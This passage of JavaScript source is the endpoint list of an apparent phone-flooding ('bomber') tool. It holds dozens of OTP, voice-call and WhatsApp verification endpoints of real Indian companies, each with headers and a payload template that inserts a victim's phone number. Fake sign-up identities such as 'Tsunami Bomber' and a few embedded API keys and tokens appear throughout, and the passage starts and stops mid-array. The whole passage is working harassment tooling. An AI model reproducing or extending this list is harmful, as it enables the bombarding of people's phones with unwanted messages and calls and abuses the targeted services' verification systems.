        name: "Swiggy_Verified",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: { "user-agent": "Swiggy-Android", "content-type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Cuemath_1",
        method: "POST",
        url: "https://www.cuemath.com/api/v4/parents/",
        headers: {
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/JSON",
            "Accept": "*/*",
            "Origin": "https://www.cuemath.com",
            "Referer": "https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "intl_mobile": { "phone": "" }, "phone": "{phone}", "email": "nsbd@dn.djs", "full_name": "hdhdhdg", "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk", "timezone": "Asia/Calcutta", "detail_source": "CMO_2020", "form_fields": "full_name,phone,email,place_id" }
    },
    {
        name: "Dream11_1",
        method: "POST",
        url: "https://www.dream11.com/graphql/mutation/pwa/register",
        headers: {
            "accept": "*/*",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register?ru=",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": { "email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia" } }
    },
    {
        name: "Doubtnut",
        method: "POST",
        url: "https://doubtnut.com/api/v1/user/login",
        headers: {
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "origin": "https://doubtnut.com",
            "referer": "https://doubtnut.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Gaana",
        method: "POST",
        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        headers: {
            "appVersion": "8.9.0",
            "CONTENT_TYPE": "application/json",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        data: { "mobile": "91-{phone}" }
    },
    {
        name: "Ajio_2",
        method: "POST",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        headers: {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup?referrer=/my-account/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        data: { "firstName": "Tsunami Bomber", "login": "tsunami@gmail.com", "password": "kd34646@3131nxnxn", "genderType": "", "mobileNumber": "{phone}", "requestType": "SENDOTP" }
    },
    {
        name: "EasyMyTrip",
        method: "POST",
        url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        headers: {
            "accept": "text/plain, */*; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://mybookings.easemytrip.com",
            "referer": "https://mybookings.easemytrip.com/MyBooking/Profile",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "emailph": "{phone}" }
    },
    {
        name: "Kotak_1",
        method: "POST",
        url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.kotak.com",
            "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes" }
    },
    {
        name: "Licious",
        url: "https://www.licious.in/api/login/signup", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.licious.in", "Referer": "https://www.licious.in/" },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "SabkaLoan", url: "https://api.sabkaloan.com/api/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sabkaloan.com", "Referer": "https://sabkaloan.com/" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "RL_Freedo_WA",
        method: "POST",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://freedo.rentals", "platform": "web", "referer": "https://freedo.rentals/", "requestfrom": "customer", "x-bn": "2.0.16", "x-channel": "WEB", "x-client-id": "FREEDO", "x-platform": "CUSTOMER" },
        data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone })
    },
    {
        name: "RL_Udaan_WA",
        method: "POST",
        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://auth.udaan.com", "x-app-id": "udaan-auth" },
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Jockey",
        method: "GET",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "PharmEasy_NEW", method: "POST",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        headers: {
            "Host": "pharmeasy.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Accept": "*/*", "Content-Type": "application/json"
        },
        data: { "contactNumber": "{phone}" }
    },
    {
        name: "Udaan", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://auth.udaan.com", "x-app-id": "udaan-auth" },
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "PocketCredit", url: "https://pocketcredit.in/api/auth/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://pocketcredit.in", "Referer": "https://pocketcredit.in/auth" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Sephora", url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869", method: "POST",
        headers: { "Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==", "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b", "x-fp-date": "20260108T112314Z", "x-fp-sdk-version": "3.3.2", "Origin": "https://sephora.in", "Referer": "https://sephora.in/" },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" })
    },
    {
        name: "Tyreplex2_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Hungama_Verified",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
    },
    {
        name: "Servetel_Verified",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)" },
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "KPNFresh_Verified",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        method: "POST",
        headers: { "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" },
        data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
    },

    // ============================================================
    // 🆕 NAYI UNTESTED APIs — CALL (from user)
    // ============================================================
    {
        name: "1MG Voice",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        headers: {"Content-Type": "application/json; charset=utf-8"},
        data: (phone) => JSON.stringify({"number": phone, "otp_on_call": true})
    },
    {
        name: "Swiggy Call",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: {"Content-Type": "application/json; charset=utf-8"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Myntra Voice",
        url: "https://www.myntra.com/gw/mobile-auth/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Paytm Voice",
        url: "https://accounts.paytm.com/signin/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Zomato Voice",
        url: "https://www.zomato.com/php/o2_api_handler.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "phone={phone}&type=voice" }
    },
    {
        name: "MakeMyTrip Voice",
        url: "https://www.makemytrip.com/api/4/voice-otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Hotstar Voice",
        url: "https://www.hotstar.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "SonyLIV Voice",
        url: "https://www.sonyliv.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Voot Voice",
        url: "https://www.voot.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "BigBasket Voice",
        url: "https://www.bigbasket.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "BookMyShow Voice",
        url: "https://in.bookmyshow.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "IRCTC Voice",
        url: "https://www.irctc.co.in/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Cleartrip Voice",
        url: "https://www.cleartrip.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Yatra Voice",
        url: "https://www.yatra.com/api/v1/voice-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Kotak Voice",
        url: "https://www.kotak.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "MagicPin Voice",
        url: "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": `91${phone}`, "authMethod": "call"})
    },
    {
        name: "Astroyogi Voice",
        url: "https://comm.astroyogi.com/api/OtpComm/SendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneCode": "91", "mobileNumber": phone, "requestType": "call"})
    },
    {
        name: "Refyne Voice",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "IVR", "recipient": phone})
    },
    {
        name: "Snitch Voice",
        url: "https://www.snitch.com/api/auth/resend-otp?mode=voice",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile_number": `+91${phone}`})
    },
    {
        name: "Ixigo Voice",
        url: "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "prefix=%2B91&phone={phone}&resendOnCall=true" }
    },
    {
        name: "Meesho Voice",
        url: "https://meesho.com/gw/login-register/v1/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Oyorooms Voice",
        url: "https://oyorooms.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
    },
    {
        name: "Doubtnut Voice",
        url: "https://doubtnut.com/api/v2/otpgenerate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Jupiter Voice",
        url: "https://jupiter.money/api/v2/auth/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
    },
    {
        name: "Pokerbaazi Voice",
        url: "https://pokerbaazi.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Zepto Voice",
        url: "https://zepto.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Ajio Voice",
        url: "https://ajio.com/v3/auth/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
    },
    {
        name: "Zivame Voice",
        url: "https://zivame.com/api/v2/customer/login/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone, "otp_type": "voice"})
    },
    {
        name: "MyJar Call",
        url: "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={phone}",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },

    // ============================================================
    // 🆕 NAYI UNTESTED APIs — WHATSAPP (from user)
    // ============================================================
    {
        name: "Foxy WhatsApp",
        url: "https://www.foxy.in/api/v2/users/send_otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"user": {"phone_number": `+91${phone}`}, "via": "whatsapp"})
    },
    {
        name: "Stratzy WhatsApp",
        url: "https://stratzy.in/api/web/whatsapp/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNo": phone})
    },
    {
        name: "Eka Care WhatsApp",
        url: "https://auth.eka.care/auth/init",
        method: "POST",
        headers: {"Content-Type": "application/json; charset=UTF-8"},
        data: (phone) => JSON.stringify({"payload": {"allowWhatsapp": true, "mobile": `+91${phone}`}, "type": "mobile"})
    },
    {
        name: "Meesho WhatsApp",
        url: "https://meesho.com/gw/login-register/v1/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Zepto WhatsApp",
        url: "https://zepto.com/api/v3/user/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "91"})
    },
    {
        name: "Swiggy WhatsApp",
        url: "https://swiggy.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "91"})
    },
    {
        name: "Paytm WhatsApp",
        url: "https://paytm.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Uber WhatsApp",
        url: "https://uber.com/api/v2/auth/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "countryCode": "91"})
    },
    {
        name: "Ola WhatsApp",
        url: "https://olacabs.com/api/v1/customers/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "BigBasket WhatsApp",
        url: "https://bigbasket.com/v1/user/otplogin",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
    },
    {
        name: "Practo WhatsApp",
        url: "https://practo.com/api/v1/customers/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
    },
    {
        name: "CureFit WhatsApp",
        url: "https://cure.fit/api/v1/customers/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "otpType": "voice"})
    },
    {
        name: "MamaEarth WhatsApp",
        url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Astroyogi WhatsApp",
        url: "https://comm.astroyogi.com/api/OtpComm/SendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneCode": "91", "mobileNumber": phone, "requestType": "whatsapp"})
    },
    {
        name: "Refyne WhatsApp",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "WHATSAPP", "recipient": phone})
    },
    {
        name: "MakeMyTrip WhatsApp",
        url: "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"loginId": phone, "type": 6, "channel": ["MOBILE", "WHATSAPP"], "countryCode": "91"})
    },
    {
        name: "Housing WhatsApp",
        url: "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"query": "mutation($phone:String){sendOtp(phone:$phone,preference:\"whatsapp\"){success}}", "variables": {"phone": phone}})
    },
    {
        name: "VisitApp WhatsApp",
        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "whatsapp", "countryCode": 91, "phone": phone, "platform": "WEB"})
    },
    {
        name: "RegistaniaChar WhatsApp",
        url: "https://admin.registaniachar.com/api/whatsapp/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "MuscleBlaze WhatsApp",
        url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9",
        method: "GET",
        headers: {}
    },

    // ============================================================
    // 🆕 NAYI UNTESTED APIs — SMS (from user)
    // ============================================================
    {
        name: "Lenskart SMS",
        url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneCode": "+91", "telephone": phone})
    },
    {
        name: "NoBroker SMS",
        url: "https://www.nobroker.in/api/v3/account/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "phone={phone}&countryCode=IN" }
    },
    {
        name: "Wakefit SMS",
        url: "https://api.wakefit.co/api/consumer-sms-otp/",
        method: "POST",
        headers: {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
        data: (phone) => JSON.stringify({"mobile": phone, "whatsapp_opt_in": 1})
    },
    {
        name: "BeepKart",
        url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "city": 362})
    },
    {
        name: "RummyCircle",
        url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "isPlaycircle": false})
    },
    {
        name: "PokerBaazi",
        url: "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "mfa_channels": "phno"})
    },
    {
        name: "Dream11",
        url: "https://www.dream11.com/auth/passwordless/init",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"})
    },
    {
        name: "Unacademy",
        url: "https://unacademy.com/api/v3/user/user_check/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "send_otp": true})
    },
    {
        name: "Vedantu",
        url: "https://user.vedantu.com/user/preLoginVerification",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "phoneCode": "+91"})
    },
    {
        name: "Byju's SMS",
        url: "https://bcas-prod.byjusweb.com/api/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "phoneNumber={phone}" }
    },
    {
        name: "Spinny OTP",
        url: "https://api.spinny.com/api/c/user/otp-request/v3/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"contact_number": phone, "whatsapp": false, "code_len": 4, "expected_action": "login"})
    },
    {
        name: "Jobhai OTP",
        url: "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Kwikfix OTP",
        url: "https://admin.kwikfixauto.in/api/auth/signupotp/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Brevistay OTP",
        url: "https://www.brevistay.com/cst/app-api/login",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Hourlyrooms OTP",
        url: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Redcliffe OTP",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone})
    },
    {
        name: "Meru Cab",
        url: "https://merucabapp.com/api/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"},
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "Dayco India",
        url: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp" }
    },
    {
        name: "Lending Plate",
        url: "https://lendingplate.com/api.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobiles={phone}&resend=Resend" }
    },
    {
        name: "NewMe SMS",
        url: "https://prodapi.newme.asia/web/otp/request",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile_number": phone, "resend_otp_request": true})
    },
    {
        name: "Smytten SMS",
        url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST",
        headers: {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
        data: (phone) => JSON.stringify({"phone": phone, "email": "sdhabai09@gmail.com"})
    },
    {
        name: "CaratLane",
        url: "https://www.caratlane.com/cg/dhevudu",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"query": `mutation { SendOtp(input: { mobile: "${phone}", isdCode: "91", otpType: "registerOtp" }) { status { message code } } }`})
    },
    {
        name: "ServeTel SMS",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "GoPink Cabs",
        url: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        data: { "_raw": "check_mobile_number=1&contact={phone}" }
    },
    {
        name: "Shemaroome",
        url: "https://www.shemaroome.com/users/resend_otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        data: { "_raw": "mobile_no=%2B91{phone}" }
    },
    {
        name: "Cossouq",
        url: "https://www.cossouq.com/mobilelogin/otp/send",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobilenumber={phone}&otptype=register" }
    },
    {
        name: "MyImagineStore",
        url: "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Otpless",
        url: "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "selectedCountryCode": "+91"})
    },
    {
        name: "MyHubble Money",
        url: "https://api.myhubble.money/v1/auth/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "channel": "SMS"})
    },
    {
        name: "DealShare",
        url: "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "hashCode": "k387IsBaTmn"})
    },
    {
        name: "RentoMojo",
        url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "DeHaat",
        url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "client_id": "kisan-app"})
    },
    {
        name: "A23 Games",
